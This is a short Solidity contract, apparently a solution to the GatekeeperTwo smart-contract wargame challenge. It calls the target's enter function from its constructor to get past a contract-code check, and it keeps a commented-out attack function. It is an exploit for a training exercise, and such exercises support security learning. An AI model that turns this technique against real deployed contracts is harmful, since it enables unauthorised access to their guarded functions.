// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";

import "hardhat/console.sol";

contract GatekeeperTwoAttack {
    GatekeeperTwo target;

    constructor(address _target, bytes8 _gateKey) {
        target = GatekeeperTwo(_target);

        target.enter(_gateKey);
    }

    // function attack(bytes8 _gateKey) public {
    //     target.enter(_gateKey);
    // }
}
